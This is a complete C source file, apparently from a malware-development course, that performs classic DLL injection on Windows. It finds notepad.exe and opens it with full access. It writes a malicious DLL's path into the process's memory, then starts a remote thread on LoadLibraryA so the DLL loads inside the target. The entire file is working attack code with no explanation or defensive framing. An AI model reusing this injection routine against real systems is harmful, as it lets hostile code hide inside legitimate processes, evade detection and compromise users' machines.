#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <libloaderapi.h>
#include <memoryapi.h>
#include "Mal_devDLL_Temp.h"


int FindTarget(LPCWSTR procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpW(procname, (LPCWSTR)pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


int main(int argc, char* argv[]) {

	HANDLE pHandle;
	PVOID remBuf;
	const char* dll = "C:\\Users\\IEUser\\Desktop\\RTO\\07.Code_Injection\\02.DLL\\Mal_devDLL_Temp.dll";
	LPCWSTR  target = L"notepad.exe";
	int pid = 0;
	LPVOID test = NULL;
	LPCWSTR ckernel = L"kernel32.dll";


	pid = FindTarget(target);
	if (pid == 0) {
		printf("Target NOT FOUND! Exiting.\n");
		return -1;
	}

	printf("Target PID: [ %d ]\nInjecting...\n", pid);

	HMODULE hKerenl = LoadLibrary(ckernel);
	if (hKerenl == NULL) {
		printf("Failed to load kernel32.dll - Error code: %d\n", GetLastError());
	}
	test = GetProcAddress(hKerenl, "LoadLibraryA");
	if (test == NULL) {
		printf("Error code: %d\n", GetLastError());
	}
	// pLoadLibrary = (LPTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle((LPCWSTR)"Kernel32.dll"), "LoadLibrary");
	printf("Loaded LoadLibrary!\n");
	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (pHandle != NULL) {
		remBuf = VirtualAllocEx(pHandle, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		WriteProcessMemory(pHandle, remBuf, (PVOID)dll, (SIZE_T)strlen(dll) + 1, (SIZE_T*)NULL);

		CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)test, remBuf, 0, NULL);
		printf("done!\nremBuf addr = %p\n", remBuf);

		CloseHandle(pHandle);
	}
	else {
		printf("OpenProcess failed! Exiting.\n");
		return -2;
	}
}
